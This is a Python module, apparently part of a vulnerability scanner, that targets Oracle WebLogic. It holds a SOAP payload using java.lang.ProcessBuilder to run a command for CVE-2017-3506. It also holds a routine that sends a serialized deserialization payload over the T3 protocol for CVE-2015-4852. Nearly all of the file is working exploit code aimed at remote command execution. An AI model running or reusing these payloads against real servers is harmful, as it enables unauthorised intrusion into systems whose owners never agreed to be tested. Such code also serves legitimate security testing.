import binascii
import socket
import requests
import struct
from urllib.parse import urlparse
from payload import headers

from Tools import dataDir


class Weblogic:

    def __init__(self):

        self.software = ["Weblogic"]
        self.vul_list = ["CVE-2017-3506","CVE-2015-4852"]


    def poc_cve_2017_3506(self,basic_url):

        url = basic_url + "/wls-wsat/CoordinatorPortType"

        content_type = {"Content-Type": "text/xml"}
        headers.update(content_type)
        proxy = {
            "http": "http://127.0.0.1:8080",
            "https": "http://127.0.0.1:8080"
        }
        payload = '''<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
              <soapenv:Header>
                <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
                  <java>
                    <object class="java.lang.ProcessBuilder">
                      <array class="java.lang.String" length="1">
                        <void index="0">
                          <string>/usr/bin/whoami</string>
                            </void>
                      </array>
                      <void method="start"/>
                    </object>
                  </java>
                </work:WorkContext>
              </soapenv:Header>
              <soapenv:Body/>
            </soapenv:Envelope>
        '''

        req = requests.post(url=url,headers=headers,data=payload,timeout=3)

        if "<faultstring>java.lang.ProcessBuilder" in req.text:
            return "CVE-2017-3506"
        else:
            return False


    def exp_cve_2015_4852(self,basic_url):

        host = urlparse(basic_url).hostname
        port = urlparse(basic_url).port

        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((host,port))

        t3_header = "t3 12.2.1\nAS:255\nHL:19\nMS:10000000\nPU:t3://us-l-breens:7001\n\n"

        sock.send(t3_header.encode())

        response = sock.recv(1024).decode()

        # if re.match("HELO", response):
        #     print("success connect to weblogic server {}".format((host,port)))

        t3_protocol_header = '000005fe016501ffffffffffffffff000000710000ea6000000018527ad5b7a859c6598d5e3023b79f7b2442a246c1443c991d027973720078720178720278700000000c00000001000000000000000000000003007070707070700000000c00000001000000000000000000000003007006fe010000'

        with open(dataDir + "cve-2015-4852.ser", "rb") as f:
            payload = binascii.b2a_hex(f.read()).decode()

        payload = t3_protocol_header + payload

        hex_length = binascii.b2a_hex(struct.pack("!i", len(payload) // 2)).decode()

        payload = hex_length + payload[8:]

        # 等价于
        # payload = '%s%s' % ('{:08x}'.format(len(payload) // 2 + 4), payload[8:])

        sock.send(binascii.a2b_hex(payload))

        return "CVE-2015-4852"
